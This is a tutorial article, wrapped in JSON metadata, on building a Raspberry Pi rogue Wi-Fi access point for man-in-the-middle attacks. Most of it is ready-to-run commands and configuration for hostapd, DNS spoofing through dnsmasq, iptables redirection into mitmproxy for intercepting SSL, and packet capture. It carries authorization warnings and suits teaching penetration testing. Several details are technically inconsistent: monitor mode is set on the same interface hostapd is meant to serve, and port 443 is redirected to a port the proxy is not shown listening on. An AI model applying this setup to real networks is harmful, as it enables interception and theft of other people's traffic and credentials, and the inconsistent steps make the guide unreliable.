{
  "title": "Building a Rogue Access Point with Raspberry Pi",
  "content": "# Building a Rogue Access Point with Raspberry Pi\n\nThis tutorial will guide you through the process of creating a rogue access point (AP) using a Raspberry Pi. This setup can be used in a controlled environment to understand network vulnerabilities and demonstrate man-in-the-middle (MITM) attacks.\n\n> **IMPORTANT:** Using this setup for unauthorized access or malicious activities is illegal and unethical. This tutorial is for educational purposes only in controlled environments with proper authorization.\n\n## What you'll learn:\n- Configure wireless interfaces in monitor mode\n- Set up DHCP and DNS spoofing\n- Implement transparent SSL proxying\n- Analyze captured network traffic\n\n## Prerequisites:\n- **Hardware:**\n  - Raspberry Pi (Model 3 B+ or later recommended for better WiFi performance)\n  - MicroSD card (at least 16GB)\n  - USB WiFi adapter (with monitor mode and packet injection support)\n  - Ethernet cable (for initial setup and internet access)\n  - A computer to SSH into the Raspberry Pi\n- **Software:**\n  - Raspberry Pi OS (Lite version is sufficient)\n  - Basic command line knowledge\n\n**Estimated Time:** 2.5 hours\n\n**Difficulty Level:** Advanced\n\n---\n\n## Step 1: Setting up the Raspberry Pi\n\n### Installing the Operating System\n- Install Raspberry Pi OS onto your microSD card using the Raspberry Pi Imager\n- For headless setup, create an empty file named `ssh` in the boot partition\n\n### Connecting to Your Pi\n- Insert the microSD card and power on your Raspberry Pi\n- Connect via SSH using the default credentials:\n  ```\n  ssh pi@<your_pi_ip_address>\n  ```\n\n### Updating System Packages\n- Update and upgrade the system:\n  ```\n  sudo apt update\n  sudo apt full-upgrade -y\n  ```\n\n### Installing Required Tools\n- Install the necessary software packages:\n  ```\n  sudo apt install -y hostapd dnsmasq iptables libnetfilter-queue-dev python3 python3-pip\n  sudo pip3 install scapy\n  ```\n\n## Step 2: Configuring the Wireless Interface\n\n### Identifying Network Interfaces\n- List available network interfaces:\n  ```\n  iwconfig\n  ```\n  > **Tip:** You'll typically see `wlan0` (built-in WiFi) and possibly `wlan1` (USB adapter). Using a separate USB adapter is recommended.\n\n### Stopping Network Services\n- Stop the WiFi connection manager:\n  ```\n  sudo systemctl stop wpa_supplicant\n  sudo systemctl disable wpa_supplicant\n  ```\n\n### Configuring Monitor Mode\n- Take down the wireless interface:\n  ```\n  sudo ip link set wlan1 down\n  ```\n- Set to monitor mode:\n  ```\n  sudo iwconfig wlan1 mode monitor\n  ```\n- Bring the interface back up:\n  ```\n  sudo ip link set wlan1 up\n  ```\n- Verify monitor mode is active:\n  ```\n  iwconfig wlan1\n  ```\n  (You should see `Mode:Monitor` in the output)\n\n## Step 3: Setting up the Rogue Access Point\n\n### Configuring hostapd\n- Create the configuration file:\n  ```\n  sudo nano /etc/hostapd/hostapd.conf\n  ```\n- Add the following configuration:\n  ```\n  interface=wlan1              # Your wireless interface\n  ssid=EvilAP                  # Network name (SSID)\n  channel=1                    # WiFi channel (1, 6, or 11 are common)\n  hw_mode=g                    # 2.4GHz band (g)\n  wpa=2                        # WPA2 encryption\n  wpa_passphrase=password123   # Network password\n  wpa_key_mgmt=WPA-PSK\n  wpa_pairwise=TKIP CCMP\n  rsn_pairwise=CCMP\n  ```\n\n### Enabling hostapd\n- Update the default configuration to use your custom file:\n  ```\n  sudo nano /etc/default/hostapd\n  ```\n- Change:\n  ```\n  DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"\n  ```\n- Start the service:\n  ```\n  sudo systemctl start hostapd\n  ```\n\n## Step 4: Setting up DHCP and DNS Spoofing\n\n### Configuring dnsmasq\n- Edit the dnsmasq configuration:\n  ```\n  sudo nano /etc/dnsmasq.conf\n  ```\n- Add the following settings:\n  ```\n  interface=wlan1                 # Wireless interface\n  dhcp-range=192.168.4.2,192.168.4.20,24h  # DHCP range\n  dhcp-option=3,192.168.4.1       # Default gateway\n  dhcp-option=6,192.168.4.1       # DNS server\n  server=8.8.8.8                  # Upstream DNS\n  server=/example.com/192.168.4.1  # DNS spoofing example\n  ```\n\n### Setting Static IP\n- Assign a static IP to your wireless interface:\n  ```\n  sudo nano /etc/dhcpcd.conf\n  ```\n- Add at the end of the file:\n  ```\n  interface wlan1\n  static ip_address=192.168.4.1/24\n  ```\n\n### Restarting Services\n- Apply the changes:\n  ```\n  sudo systemctl daemon-reload\n  sudo systemctl restart dhcpcd\n  sudo systemctl restart hostapd\n  sudo systemctl restart dnsmasq\n  ```\n\n## Step 5: Enabling IP Forwarding and NAT\n\n### Setting Up IP Forwarding\n- Enable packet forwarding:\n  ```\n  sudo sysctl net.ipv4.ip_forward=1\n  ```\n- Make it permanent (edit sysctl.conf):\n  ```\n  sudo nano /etc/sysctl.conf\n  ```\n- Uncomment: `net.ipv4.ip_forward=1`\n\n### Configuring NAT\n- Set up Network Address Translation:\n  ```\n  sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n  sudo iptables -A FORWARD -i wlan1 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT\n  sudo iptables -A FORWARD -i eth0 -o wlan1 -j ACCEPT\n  ```\n  > **Note:** If using built-in WiFi for internet, replace `eth0` with `wlan0`\n\n### Making Rules Persistent\n- Install iptables-persistent:\n  ```\n  sudo apt install -y iptables-persistent\n  ```\n- Save current rules when prompted\n\n## Step 6: Implementing SSL Proxying\n\n### Installing mitmproxy\n- Install the proxy tool:\n  ```\n  sudo pip3 install mitmproxy\n  ```\n\n### Redirecting Traffic\n- Set up traffic redirection:\n  ```\n  sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT --to-ports 8080\n  sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j REDIRECT --to-ports 8081\n  ```\n\n### Running mitmproxy\n- Start in transparent mode:\n  ```\n  sudo mitmproxy --mode transparent --ssl-insecure\n  ```\n\n## Step 7: Analyzing Network Traffic\n\n### Capturing with tcpdump\n- Record network traffic:\n  ```\n  sudo tcpdump -i wlan1 -w capture.pcap\n  ```\n\n### Using tshark\n- Alternative capture method:\n  ```\n  sudo tshark -i wlan1 -w capture.pcap\n  ```\n\n### Analyzing Results\n- After capturing traffic:\n  1. Stop the capture (Ctrl+C)\n  2. Transfer the capture.pcap file to a computer with Wireshark\n  3. Open and analyze the file using Wireshark's analysis tools\n\n---\n\n## Testing the Rogue AP\n\n1. Connect a device to your \"EvilAP\" WiFi network\n2. Browse to various websites\n3. Observe the intercepted traffic in mitmproxy\n4. Check if DNS spoofing works by accessing example.com\n\n## Security Considerations\n\n> **WARNING: Legal and Ethical Implications**\n\n- **Authorization:** Only use in environments you own or have explicit permission to test\n- **Isolation:** Keep your testing network isolated from production networks\n- **Legal Boundaries:** Unauthorized access to networks is illegal in most jurisdictions\n- **Privacy:** Be transparent with participants if conducting security awareness training\n- **Clean Up:** Always disable the AP and services after testing\n\n## Conclusion\n\nThis tutorial has demonstrated how to set up a rogue access point using a Raspberry Pi. Understanding these techniques is crucial for network security professionals to identify vulnerabilities and protect against similar attacks. Remember that knowledge of security vulnerabilities comes with the responsibility to use it ethically and legally.\n\nBy following proper security practices and being aware of potential threats, you can help build more secure networks and systems.",
  "preview": "Learn how to set up a WiFi honeypot for network security testing and demonstration of man-in-the-middle attacks using a Raspberry Pi. This comprehensive guide covers wireless configuration, DHCP/DNS spoofing, and traffic analysis.",
  "category": "Network Security",
  "readTime": "25 minutes",
  "tags": ["raspberry pi", "wireless", "wifi", "network security", "hacking", "MITM", "honeypot", "tutorial", "penetration testing"],
  "imageUrl": "https://example.com/images/rogue-access-point.jpg"
}